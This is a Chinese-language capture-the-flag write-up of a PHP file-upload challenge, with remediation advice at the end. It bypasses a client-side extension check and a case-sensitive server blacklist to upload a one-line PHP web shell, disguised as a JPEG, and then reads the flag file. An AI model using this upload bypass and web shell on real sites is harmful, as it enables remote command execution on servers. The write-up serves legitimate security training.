# Show Me Your Beauty

## 题目简述

题目是 PHP 文件上传。浏览器端只允许选择 `.jpg`、`.png`、`.gif`，服务端又用扩展名黑名单拒绝 `php`、`phtm`、`ini`、`htaccess`。漏洞在于服务端比较扩展名时区分大小写，而 PHP 环境仍会把大写 `.PHP` 当作脚本执行；前端扩展名和表单 `accept` 限制均可在抓包后修改。

## 解题过程

### 绕过客户端检查

前端 JavaScript 的检查为：

```javascript
if (!/\.(?:jpg|png|gif)$/.test(ext)) {
    alert("Invalid file extensions!");
    return false;
}
```

HTML 文件选择器还设置了：

```html
accept="image/jpg,image/jpeg,image/gif"
```

两者都只发生在客户端。可以先选择一个 `.jpg` 文件，再用 Burp Suite 修改上传请求；也可以直接删除页面上的限制。

### 利用大小写敏感黑名单

服务端拒绝的扩展名为：

```php
$blacklist = ["php", "phtm", "ini", "htaccess"];
```

黑名单没有把扩展名统一为小写，因此将文件名从 `test.jpg` 改为 `test.PHP` 即可绕过。上传内容可以使用最小 PHP 命令执行代码：

```php
<?php system($_POST['cmd']); ?>
```

对应的关键 multipart 片段如下；`Content-Type` 仍伪装成图片类型：

```http
Content-Disposition: form-data; name="file"; filename="test.PHP"
Content-Type: image/jpeg

<?php system($_POST['cmd']); ?>
```

服务端响应会给出上传路径，例如：

```text
./img/test.PHP
```

保持上传时的会话 Cookie，访问该脚本并提交 `cmd=cat /flag`，即可读取：

```text
hgame{Unsave_F1L5_SYS7em_UPL0ad!}
```

## 方法总结

- 核心技巧：拦截上传请求，绕过客户端限制，并利用大小写敏感扩展名黑名单上传 `.PHP` 脚本。
- 关键细节：文件名、multipart 中声明的 MIME 类型和文件内容彼此独立；浏览器的 `accept` 属性不是安全边界。
- 修复思路：服务端应对扩展名做规范化后使用白名单，同时验证真实文件类型，将上传目录设为不可执行，并由服务端生成随机文件名。
